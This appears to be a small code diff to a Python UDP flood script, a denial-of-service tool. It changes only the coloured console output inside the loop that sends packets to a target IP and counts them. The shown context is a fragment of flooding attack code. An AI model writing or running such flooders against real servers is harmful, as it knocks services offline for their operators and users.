@@ -82,7 +82,7 @@ def udp_flood(ip, port, message, duration):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"\033[48;5;7m\033[38;5;0mSend messages to the server" +str(ip)+ "\033[0m \033[33minfo running \033[32m"+{packet_count}+"")
+            print(f"\033[48;5;7m\033[38;5;0m {packet_count}\033[0m \033[38;5;2mSend messages to the server \033[48;5;7m" +str(ip)+ "\033[33minfo running")
             print(f"\033[38mSend messages to the server \033[38;5;1m" +str(ip)+ "")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
